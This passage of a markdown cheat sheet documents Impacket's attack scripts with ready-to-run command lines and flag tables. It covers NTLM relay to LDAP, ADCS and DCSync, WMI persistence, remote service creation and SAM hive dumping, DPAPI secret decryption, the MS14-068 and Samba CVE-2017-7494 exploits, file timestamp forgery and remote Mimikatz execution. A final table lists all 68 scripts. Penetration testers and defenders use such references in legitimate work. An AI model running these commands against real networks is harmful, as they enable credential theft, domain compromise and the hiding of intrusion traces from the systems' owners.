  -smb2support --adcs --template DomainController

# Relay to RPC (ADCS ICPR)
ntlmrelayx.py -t rpc://<ca_ip> -smb2support \
  -rpc-mode ICPR -icpr-ca-name <ca_name>

# Relay to MSSQL
ntlmrelayx.py -t mssql://<ip> -smb2support -socks

# Relay to DCSync
ntlmrelayx.py -t dcsync://<dc_ip> -smb2support -auth-smb <user>:<pass>

# SOCKS mode (keep sessions open)
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Interactive mode
ntlmrelayx.py -t ldaps://<dc_ip> -smb2support --interactive

# Remove MIC (CVE-2019-1040)
ntlmrelayx.py -t ldaps://<dc_ip> -smb2support --remove-mic

# IPv6
ntlmrelayx.py -tf targets.txt -smb2support -6

# Specify listening ports
ntlmrelayx.py -t <target> --smb-port 445 --http-port 80

# WPAD configuration
ntlmrelayx.py -t <target> -wh <wpad_host> -wa <auth_num>

# SCCM policy extraction
ntlmrelayx.py -t <target> --sccm-policies

# Execute command on relay
ntlmrelayx.py -t smb://<ip> -c "whoami"

# Enumerate local admins
ntlmrelayx.py -tf targets.txt -e

# Loot directory
ntlmrelayx.py -tf targets.txt -l /tmp/loot

# Add DNS record
ntlmrelayx.py -t ldaps://<dc_ip> --add-dns-record <hostname> <ip>
```

### Key ntlmrelayx Flags

| Flag | Description |
|------|-------------|
| `-t TARGET` | Target to relay to (smb://, ldap://, ldaps://, mssql://, http://, rpc://, dcsync://) |
| `-tf FILE` | File with target list |
| `-smb2support` | Enable SMB2 support on listener |
| `-socks` | Enable SOCKS proxy for relayed sessions |
| `-socks-port PORT` | SOCKS proxy port (default: 1080) |
| `--interactive` | Start interactive LDAP shell |
| `--remove-mic` | Remove MIC from NTLM auth (CVE-2019-1040) |
| `-c COMMAND` | Command to execute on target |
| `-e` | Enumerate local admins |
| `-l LOOTDIR` | Loot directory |
| `--escalate-user USER` | Escalate user's privileges (DCSync) |
| `--delegate-access` | Set up RBCD delegation |
| `--add-computer NAME PASS` | Add a computer account |
| `--shadow-credentials` | Set shadow credentials |
| `--shadow-target TARGET` | Shadow credentials target |
| `--dump-laps` | Dump LAPS passwords |
| `--dump-gmsa` | Dump gMSA passwords |
| `--dump-adcs` | Dump ADCS info |
| `--adcs` | Request certificate from ADCS |
| `--template TEMPLATE` | Certificate template name |
| `-rpc-mode MODE` | RPC relay mode |
| `-icpr-ca-name NAME` | CA name for ICPR relay |
| `-auth-smb USER:PASS` | Credentials for DCSync relay |
| `--no-dump` | Don't auto-dump secrets |
| `--no-da` | Don't auto-add DA |
| `--no-acl` | Don't auto-modify ACL |
| `-6` | Enable IPv6 |
| `-wh HOST` | WPAD host |
| `--sccm-policies` | Extract SCCM policies |
| `--sccm-dp` | Loot SCCM distribution point |

---

## RPC Tools

### rpcdump.py

Dump remote RPC endpoint information via the endpoint mapper.

```bash
rpcdump.py <domain>/<user>:<password>@<ip>

# Specific port
rpcdump.py <domain>/<user>:<password>@<ip> -port 135
```

---

### rpcmap.py

Probe for listening MSRPC interfaces.

```bash
# Map RPC interfaces
rpcmap.py ncacn_ip_tcp:<ip>[135]

# Brute force UUIDs
rpcmap.py -brute-uuids ncacn_ip_tcp:<ip>[135]

# Brute force opnums
rpcmap.py -brute-opnums ncacn_ip_tcp:<ip>[135]
```

---

## WMI Tools

### wmiquery.py

Execute WQL queries interactively.

```bash
wmiquery.py <domain>/<user>:<password>@<ip>

# Specific namespace
wmiquery.py -namespace root/cimv2 <domain>/<user>:<password>@<ip>

# Execute from file
wmiquery.py -file queries.wql <domain>/<user>:<password>@<ip>
```

---

### wmipersist.py

Create WMI persistence via event consumers and filters.

```bash
# Create persistence
wmipersist.py -name <name> -vbs <script.vbs> -filter <filter_query> \
  <domain>/<user>:<password>@<ip>

# Timer-based trigger
wmipersist.py -name <name> -vbs <script.vbs> -timer <milliseconds> \
  <domain>/<user>:<password>@<ip>

# Remove persistence
wmipersist.py -name <name> -remove <domain>/<user>:<password>@<ip>
```

---

## Windows Administration

### services.py

Manipulate Windows services remotely.

```bash
# List services
services.py <domain>/<user>:<password>@<ip> list

# Start/Stop/Status
services.py <domain>/<user>:<password>@<ip> start -name <service>
services.py <domain>/<user>:<password>@<ip> stop -name <service>
services.py <domain>/<user>:<password>@<ip> status -name <service>
services.py <domain>/<user>:<password>@<ip> config -name <service>

# Delete service
services.py <domain>/<user>:<password>@<ip> delete -name <service>

# Create service
services.py <domain>/<user>:<password>@<ip> create -name <service> \
  -display <display_name> -path <binary_path>

# Change service configuration
services.py <domain>/<user>:<password>@<ip> change -name <service> \
  -start_type demand -service_type own
```

**Subcommands**: `list`, `start`, `stop`, `delete`, `status`, `config`, `create`, `change`

---

### reg.py

Remote Windows Registry manipulation.

```bash
# Query registry key
reg.py <domain>/<user>:<password>@<ip> query -keyName 'HKLM\SOFTWARE\Microsoft'

# Query specific value
reg.py <domain>/<user>:<password>@<ip> query -keyName 'HKLM\SYSTEM' -v <valuename>

# Search subkeys
reg.py <domain>/<user>:<password>@<ip> query -keyName 'HKLM\SOFTWARE' -s

# Add registry value
reg.py <domain>/<user>:<password>@<ip> add \
  -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' \
  -v DisableRestrictedAdmin -vt REG_DWORD -vd 0

# Delete value
reg.py <domain>/<user>:<password>@<ip> delete -keyName 'HKLM\key' -v <value>
reg.py <domain>/<user>:<password>@<ip> delete -keyName 'HKLM\key' -va  # Delete all values

# Backup registry hive
reg.py <domain>/<user>:<password>@<ip> backup -keyName 'HKLM\SAM' -o '\\<ip>\share'
reg.py <domain>/<user>:<password>@<ip> save -keyName 'HKLM\SAM' -o '\\<ip>\share'
```

**Subcommands**: `query`, `add`, `delete`, `backup`, `save`

---

### tstool.py

Terminal Services / RDP session manipulation.

```bash
# List sessions
tstool.py <domain>/<user>:<password>@<ip> query

# Send message
tstool.py <domain>/<user>:<password>@<ip> msg -session <id> \
  -title "Title" -message "Message"

# Disconnect session
tstool.py <domain>/<user>:<password>@<ip> disc -session <id>

# Logoff session
tstool.py <domain>/<user>:<password>@<ip> logoff -session <id>

# Shutdown/Reboot
tstool.py <domain>/<user>:<password>@<ip> shutdown
tstool.py <domain>/<user>:<password>@<ip> shutdown -reboot
```

**Subcommands**: `query`, `msg`, `disc`, `logoff`, `shutdown`

---

### machine_role.py

Retrieve a host's role (workstation, server, DC, etc.).

```bash
machine_role.py <domain>/<user>:<password>@<ip>
```

---

### getArch.py

Determine the architecture (32/64 bit) of a remote system.

```bash
# Single target
getArch.py -target <ip>

# Multiple targets
getArch.py -targets hosts.txt
```

---

## DPAPI

### dpapi.py

Comprehensive DPAPI credential decryption toolkit.

```bash
# Decrypt masterkey (online, connects to DC for backup key)
dpapi.py masterkey -file <masterkey_file> -sid <user_sid> \
  -password <password> -t <domain>/<user>:<pass>@<dc>

# Decrypt masterkey (offline with PVK)
dpapi.py masterkey -file <masterkey_file> -pvk <backup_key.pvk>

# Decrypt credential file
dpapi.py credential -file <cred_file> -key <masterkey_hex>

# Decrypt vault (vcrd + vpol)
dpapi.py vault -vcrd <vcrd_file> -vpol <vpol_file> -key <masterkey>

# Decrypt blob
dpapi.py blob -file <blob_file> -key <masterkey>

# Decrypt with entropy
dpapi.py blob -file <blob_file> -key <masterkey> -entropy <hex_entropy>

# Backup domain DPAPI key
dpapi.py backupkeys -t <domain>/<user>:<pass>@<dc> --export
```

**Subcommands**: `masterkey`, `credential`, `vault`, `blob`, `backupkeys`

---

## Exchange

### exchanger.py

Enumerate and abuse Exchange services.

```bash
# Enumerate via NSPI
exchanger.py <domain>/<user>:<password>@<exchange_ip> nspi list-tables

# Dump address list
exchanger.py <domain>/<user>:<password>@<exchange_ip> nspi dump-tables

# Enumerate via RFR
exchanger.py <domain>/<user>:<password>@<exchange_ip> rfr

# Specify transport
exchanger.py -transport http <domain>/<user>:<password>@<exchange_ip> nspi list-tables
```

---

### Get-GPPPassword.py

Find and decrypt Group Policy Preferences passwords.

```bash
# Remote (from SYSVOL share)
Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>

# Parse local XML file
Get-GPPPassword.py -xmlfile <file.xml> LOCAL
```

---

## Network Utilities

### ping.py / ping6.py

ICMP ping utilities.

```bash
ping.py <target_ip>
ping6.py <target_ip>
```

---

### sniff.py / sniffer.py

Network packet sniffing utilities.

```bash
sniff.py
sniffer.py
```

---

### kintercept.py

TCP stream interception proxy.

```bash
kintercept.py --server-port <port> --listen-port <port> --listen-addr <addr>
```

---

### rdp_check.py

Test RDP credentials against a target.

```bash
rdp_check.py <domain>/<user>:<password>@<ip>

# With hash
rdp_check.py -hashes :<nthash> <domain>/<user>@<ip>
```

---

### mqtt_check.py

Test MQTT login credentials.

```bash
mqtt_check.py <user>:<password>@<target>

# With SSL and custom port
mqtt_check.py -ssl -port 8883 <user>:<password>@<target>
```

---

### goldenPac.py

MS14-068 exploit. Obtains a golden PAC and executes commands via PSExec.

```bash
goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@<target>

# With specific command
goldenPac.py -dc-ip <dc_ip> -c "command" <domain>/<user>:<password>@<target>
```

---

### sambaPipe.py

Samba pipe exploit (CVE-2017-7494).

```bash
sambaPipe.py -so <path/to/evil.so> <domain>/<user>:<password>@<target>
```

---

## File & Registry Utilities

### esentutl.py

Extensible Storage Engine (ESE/JET) database reader. Used for parsing NTDS.dit and other ESE databases.

```bash
# Dump table
esentutl.py <database_file> dump -table <table_name>

# List pages
esentutl.py <database_file> list -page <page_num>

# Export data
esentutl.py <database_file> export -table <table_name>
```

---

### ntfs-read.py

Read-only NTFS filesystem explorer.

```bash
# Mount and explore
ntfs-read.py <device_or_image>

# Extract specific file
ntfs-read.py <device_or_image> -extract <path>
```

---

### registry-read.py

Parse offline Windows registry hive files.

```bash
# List all keys
registry-read.py <hive_file> enum -name '\' -recursive

# Query specific key
registry-read.py <hive_file> query -name '\Software\Microsoft'

# List values
registry-read.py <hive_file> values -name '\key\path'
```

**Subcommands**: `enum`, `query`, `values`, `export`, `cat`

---

### attrib.py

Remote file attribute modification utility.

```bash
# Query attributes
attrib.py <domain>/<user>:<password>@<ip> <share_path>

# Set hidden
attrib.py <domain>/<user>:<password>@<ip> <share_path> -H

# Set readonly
attrib.py <domain>/<user>:<password>@<ip> <share_path> -r
```

---

### filetime.py

Remote file timestamp querying and modification.

```bash
# Query timestamps
filetime.py <domain>/<user>:<password>@<ip> <share_path>

# Set timestamp
filetime.py <domain>/<user>:<password>@<ip> <share_path> \
  -c "2023-01-01 00:00:00" -a "2023-01-01 00:00:00" -w "2023-01-01 00:00:00"

# Copy timestamps from reference file
filetime.py <domain>/<user>:<password>@<ip> <share_path> -r <reference_path>
```

---

### split.py

Utility for splitting large files.

```bash
split.py <input_file> <chunk_size>
```

---

### mimikatz.py

Upload and execute Mimikatz remotely via SMB.

```bash
# Interactive mode
mimikatz.py <domain>/<user>:<password>@<ip>

# Execute commands from file
mimikatz.py -file commands.txt <domain>/<user>:<password>@<ip>
```

---

## All 68 Scripts - Quick Reference

| Script | Category | Purpose |
|--------|----------|---------|
| `psexec.py` | Execution | Interactive SYSTEM shell via service creation |
| `smbexec.py` | Execution | Shell via temporary service (no binary upload) |
| `wmiexec.py` | Execution | Shell via WMI/DCOM |
| `dcomexec.py` | Execution | Shell via DCOM objects |
| `atexec.py` | Execution | Command execution via Task Scheduler |
| `secretsdump.py` | Cred Dump | SAM/LSA/NTDS.dit/DCSync dump |
| `regsecrets.py` | Cred Dump | Secrets via direct registry reads |
| `getTGT.py` | Kerberos | Request TGT |
| `getST.py` | Kerberos | Request TGS (S4U2Self/S4U2Proxy/U2U) |
| `ticketer.py` | Kerberos | Forge Golden/Silver/Diamond/Sapphire tickets |
| `ticketConverter.py` | Kerberos | Convert kirbi <-> ccache |
| `describeTicket.py` | Kerberos | Parse and decode Kerberos tickets |
| `GetNPUsers.py` | Kerberos | ASREPRoast |
| `GetUserSPNs.py` | Kerberos | Kerberoasting |
| `getPac.py` | Kerberos | Request and parse PAC |
| `keylistattack.py` | Kerberos | RODC key list attack |
| `goldenPac.py` | Kerberos | MS14-068 exploit |
| `GetADUsers.py` | AD Enum | Enumerate domain users |
| `GetADComputers.py` | AD Enum | Enumerate domain computers |
| `GetLAPSPassword.py` | AD Enum | Extract LAPS passwords |
| `findDelegation.py` | AD Enum | Find delegation relationships |
| `lookupsid.py` | AD Enum | SID brute forcing/lookup |
| `samrdump.py` | AD Enum | User enumeration via SAMR |
| `CheckLDAPStatus.py` | AD Enum | Check LDAP signing/binding |
| `DumpNTLMInfo.py` | AD Enum | Dump NTLM info from target |
| `netview.py` | AD Enum | Enumerate network sessions |
| `Get-GPPPassword.py` | AD Enum | Find GPP passwords |
| `addcomputer.py` | AD Manip | Add/delete computer accounts |
| `rbcd.py` | AD Manip | Manage RBCD delegation |
| `dacledit.py` | AD Manip | Edit DACLs on AD objects |
| `owneredit.py` | AD Manip | Change AD object ownership |
| `badsuccessor.py` | AD Manip | dMSA exploitation |
| `changepasswd.py` | AD Manip | Change/reset passwords |
| `raiseChild.py` | AD Manip | Child-to-parent domain escalation |
| `net.py` | AD Manip | User/group/alias management (SAMR) |
| `samedit.py` | AD Manip | Offline SAM password editing |
| `smbclient.py` | SMB | Interactive SMB file browser |
| `smbserver.py` | SMB | Launch local SMB server |
| `karmaSMB.py` | SMB | SMB server for file poisoning |
| `mssqlclient.py` | MSSQL | Interactive MSSQL client |
| `mssqlinstance.py` | MSSQL | Discover MSSQL instances |
| `ntlmrelayx.py` | Relay | NTLM relay framework |
| `rpcdump.py` | RPC | Dump RPC endpoints |
| `rpcmap.py` | RPC | Map RPC interfaces |
| `wmiquery.py` | WMI | Execute WQL queries |
| `wmipersist.py` | WMI | WMI event persistence |
| `services.py` | Admin | Windows service management |
| `reg.py` | Admin | Remote registry manipulation |
| `tstool.py` | Admin | Terminal Services management |
| `machine_role.py` | Admin | Identify host role |
| `getArch.py` | Admin | Detect remote architecture |
| `dpapi.py` | DPAPI | Decrypt DPAPI-protected secrets |
| `exchanger.py` | Exchange | Exchange service enumeration |
| `registry-read.py` | Offline | Parse offline registry hives |
| `esentutl.py` | Offline | Parse ESE databases (NTDS.dit) |
| `ntfs-read.py` | Offline | Read NTFS filesystems |
| `attrib.py` | File Ops | Remote file attribute modification |
| `filetime.py` | File Ops | Remote file timestamp modification |
| `mimikatz.py` | Execution | Remote Mimikatz execution |
| `rdp_check.py` | Network | Test RDP credentials |
| `mqtt_check.py` | Network | Test MQTT credentials |
| `ping.py` | Network | ICMP ping |
| `ping6.py` | Network | ICMPv6 ping |
| `sniff.py` | Network | Packet sniffing |
| `sniffer.py` | Network | Packet sniffing |
| `kintercept.py` | Network | TCP stream interception |
| `sambaPipe.py` | Exploit | Samba CVE-2017-7494 |
| `split.py` | Utility | File splitting |

---

*Source: [Impacket GitHub Repository](https://github.com/fortra/impacket) - Fortra/Core Security*